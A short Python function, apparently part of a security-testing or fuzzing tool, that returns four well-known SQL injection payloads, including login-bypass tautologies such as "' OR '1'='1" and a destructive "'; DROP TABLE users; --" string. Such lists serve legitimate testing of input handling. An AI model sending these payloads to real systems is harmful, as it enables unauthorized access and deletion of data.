def generate_basic_payloads():
    return [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' OR 1=1 --",
        "\" OR \"\" = \""
    ]
